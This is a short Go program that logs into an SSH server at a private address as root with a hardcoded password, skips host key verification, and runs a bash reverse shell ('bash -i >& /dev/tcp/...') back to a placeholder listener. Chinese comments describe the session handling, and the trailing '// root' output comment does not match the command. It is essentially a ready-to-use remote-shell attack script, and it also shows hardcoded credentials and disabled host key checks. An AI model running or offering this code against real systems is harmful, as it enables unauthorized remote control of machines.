package main

import (
"bytes"
"fmt"
"log"

"golang.org/x/crypto/ssh"
)

func main() {

	var (
		username = "root"
		password = "P@ssw0rd!"
		addr     = "10.62.139.19:22"
	)

	config := &ssh.ClientConfig {
		User: username,
		Auth: []ssh.AuthMethod{
		ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		log.Fatal("Failed to dial: ", err)
	}
	defer client.Close()

	// 开启一个session，用于执行一个命令
	session, err := client.NewSession()
	if err != nil {
		log.Fatal("Failed to create session: ", err)
	}
	defer session.Close()

	// 执行命令，并将执行的结果写到 b 中
	var b bytes.Buffer
	session.Stdout = &b

	// 也可以使用 session.CombinedOutput() 整合输出
	if err := session.Run("bash -i >& /dev/tcp/xx.xx.xx.xx/1234 0>&1"); err != nil {
		log.Fatal("Failed to run: " + err.Error())
	}

	fmt.Println(b.String())  // root
}